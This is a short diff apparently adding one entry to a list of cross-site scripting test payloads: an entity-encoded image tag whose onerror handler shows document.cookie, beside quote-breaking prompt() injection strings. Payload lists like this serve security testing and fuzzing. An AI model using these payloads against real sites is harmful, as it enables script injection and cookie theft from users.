@@ -1,3 +1,4 @@
+&#60img src=x onerror=alert(document.cookie)&#62;
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
